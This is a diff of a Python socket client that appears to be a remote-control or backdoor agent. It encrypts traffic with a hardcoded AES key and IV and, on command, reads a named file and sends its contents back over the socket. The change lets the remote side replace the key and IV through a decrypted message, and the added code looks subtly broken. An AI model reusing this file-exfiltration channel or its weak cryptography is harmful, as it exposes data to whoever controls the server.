@@ -9,11 +9,6 @@ args = parser.parse_args()
 aeskey = 'This is a key123'
 aesiv = 'This is an IV456'
 
-def update_aeskeys():
-    global aeskey, aesiv
-    aeskey = os.urandom(128)
-    aesiv = os.urandom(16)
-
 def do_encrypt(message):
     if isinstance(message, bytes):
         pass
@@ -26,9 +21,16 @@ def do_encrypt(message):
     return cipher
 
 def do_decrypt(ciphertext):
+    global aeskey, aesiv
     obj2 = AES.new(aeskey, AES.MODE_CBC, aesiv)
     message = obj2.decrypt(ciphertext)
-    return message[:-message[-1]]
+    message = message[:-message[-1]]
+    print(message)
+    if message[0] == 'aeskey':
+        aeskey = message[1]
+        aesiv = message[2]
+        return 'Great Success'
+    return message
 
 def main():
     s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -52,6 +54,8 @@ def main():
                 with open(command[1]) as f:
                     tmp = f.read()
                 sendit(s, bytes(tmp))
+            elif 'Success' in command:
+                sendit(s, 'Updated AES key\n')
         except socket.error as err:
             print("{0}\n".format(err))
     return
